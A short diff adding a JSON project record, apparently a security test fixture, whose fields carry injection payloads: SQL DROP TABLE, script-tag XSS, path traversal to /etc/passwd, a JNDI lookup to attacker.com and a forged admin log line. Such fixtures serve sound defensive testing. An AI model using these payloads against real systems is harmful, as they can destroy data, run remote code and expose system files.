@@ -1,0 +1,10 @@
+{
+  "name": "'; DROP TABLE projects; --",
+  "description": "Legitimate project<script>alert('XSS')</script>",
+  "metadata": {
+    "priority": "../../../../etc/passwd",
+    "deadline": "${jndi:ldap://attacker.com/exploit}",
+    "budget": 999999999,
+    "department": "\n\n[INJECTED LOG] Admin granted full access\n\n"
+  }
+}
